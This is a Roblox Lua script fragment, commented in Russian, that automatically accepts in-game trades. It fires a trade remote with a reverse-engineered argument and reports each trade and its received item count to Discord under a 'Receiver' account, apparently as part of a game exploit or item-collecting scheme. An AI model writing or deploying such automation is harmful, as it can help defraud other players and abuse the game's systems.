-- ========== ОБРАБОТКА ТРЕЙДОВ ==========
Trade.StartTrade.OnClientEvent:Connect(function(tradeData, otherName)
    print("\n========== Трейд начался с", otherName, "==========")
    logToDiscord("🤝 Receiver `" .. LocalPlayer.Name .. "` начал трейд с `" .. otherName .. "`")
    
    local lastOfferTimestamp = 0
    local lastUpdateTick = tick()
    local tradeFinished = false
    
    if tradeData and tradeData.LastOffer then
        lastOfferTimestamp = tradeData.LastOffer
    end
    
    local connections = {}
    
    connections.update = Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if not data then return end
        if data.LastOffer then lastOfferTimestamp = data.LastOffer end
        lastUpdateTick = tick()
        print("[Update] lastOffer =", lastOfferTimestamp)
    end)
    
    connections.accept = Trade.AcceptTrade.OnClientEvent:Connect(function(_, items)
        tradeFinished = true
        local count = items and #items or 0
        print("[Finish] Получено:", count, "предметов")
        logToDiscord("✅ Трейд завершён, получено: " .. count .. " предметов")
    end)
    
    connections.decline = Trade.DeclineTrade.OnClientEvent:Connect(function()
        tradeFinished = true
        warn("[Finish] Трейд отменён")
    end)
    
    local function cleanup()
        for _, c in pairs(connections) do
            if c and c.Connected then c:Disconnect() end
        end
    end
    
    task.wait(1)
    
    task.spawn(function()
        while not tradeFinished do
            print("[Wait] Жду", COOLDOWN, "сек без изменений...")
            while not tradeFinished do
                if tick() - lastUpdateTick >= COOLDOWN then break end
                task.wait(0.2)
            end
            if tradeFinished then break end
            
            local acceptStamp = lastOfferTimestamp
            print("[Accept] AcceptTrade с lastOffer =", acceptStamp)
            Trade.AcceptTrade:FireServer(game.PlaceId * 3, acceptStamp)
            
            local sentAt = tick()
            while not tradeFinished and tick() - sentAt < 2 do
                if lastUpdateTick > sentAt then
                    print("[Accept] Новый Update — повторяю")
                    break
                end
                task.wait(0.1)
            end
            
            if not tradeFinished and lastUpdateTick <= sentAt then
                while not tradeFinished and lastUpdateTick <= sentAt do
                    task.wait(0.3)
                end
            end
        end
        cleanup()
        print("========== Трейд закрыт ==========\n")
    end)
end)

